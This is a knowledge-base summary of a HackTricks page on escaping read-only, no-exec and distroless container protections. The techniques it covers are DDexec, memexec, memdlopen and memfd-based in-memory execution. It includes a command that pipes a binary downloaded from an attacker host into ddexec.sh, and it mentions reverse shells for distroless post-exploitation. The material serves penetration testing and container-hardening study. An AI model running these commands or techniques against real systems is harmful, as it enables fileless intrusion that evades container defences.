---
title: "HackTricks: Bypass FS Protections — Read-Only / No-exec / Distroless"
tags:
  [
    container-security,
    linux-hardening,
    privilege-escalation,
    distroless,
    memory-execution,
  ]
sources: [hacktricks-bypass-fs-protections.md]
updated: 2026-05-01
---

# HackTricks: Bypass FS Protections — Read-Only / No-exec / Distroless

Source: [hacktricks-bypass-fs-protections.md](../../raw/hacktricks-bypass-fs-protections.md)

## Key Takeaways

Read-only root filesystems and `no-exec` mounts prevent writing and executing files on disk — but **not execution from memory**. The techniques below allow arbitrary binary execution even when the filesystem is read-only, no-exec, or the container is distroless (no shell, no package manager).

## The Problem

- `readOnlyRootFilesystem: true` in Kubernetes → root filesystem is read-only
- `/dev/shm` remains writable but has `no-exec` → can write there but cannot execute
- Distroless: no `sh`, `bash`, `ls`, `whoami` — only the app runtime and its dependencies
- Scripts still execute if the interpreter is present (sh script if `sh` exists, Python script if Python is installed)

## Memory Execution Techniques

### 1. fileless-elf-exec (create_memfd + exec syscall)

Requires Python, Perl, or Ruby (not PHP/Node — they lack raw syscall access):

```bash
# Tool: https://github.com/nnsee/fileless-elf-exec
# Generates a script that: downloads binary → creates memory FD via create_memfd → exec
```

- Creates an anonymous memory file descriptor (not subject to `no-exec`)
- Calls `exec` syscall with the memfd as the executable

### 2. DDexec / EverythingExec

Overwrites `/proc/self/mem` to mutate the running process's assembly:

```bash
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

- No file written to disk
- Works on read-only + no-exec filesystems
- Tool: [arget13/DDexec](https://github.com/arget13/DDexec)

### 3. Memexec

DDexec shellcode daemonized — load once, inject multiple binaries without relaunching DDexec:

```
memexec shellcode → daemon accepting new binaries → load and run each
```

Example: [memexec from a PHP reverse shell](https://github.com/arget13/memexec/blob/main/a.php)

### 4. Memdlopen

Similar to DDexec but easier to load binaries with dependencies:

- Tool: [arget13/memdlopen](https://github.com/arget13/memdlopen)

## Distroless Post-Exploitation

- No `sh`/`bash` → use scripting runtime present for the app (Python → Python reverse shell, Node → Node shell)
- Enumerate system using language capabilities (file I/O, subprocess, socket)
- Use memory execution techniques above to run arbitrary binaries
- Examples: [carlospolop/DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)

## Related

- [container-security](../concepts/container-security.md)
- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Distroless](hacktricks-distroless.md)
- [HackTricks: Bypass Bash Restrictions](hacktricks-bypass-bash-restrictions.md)
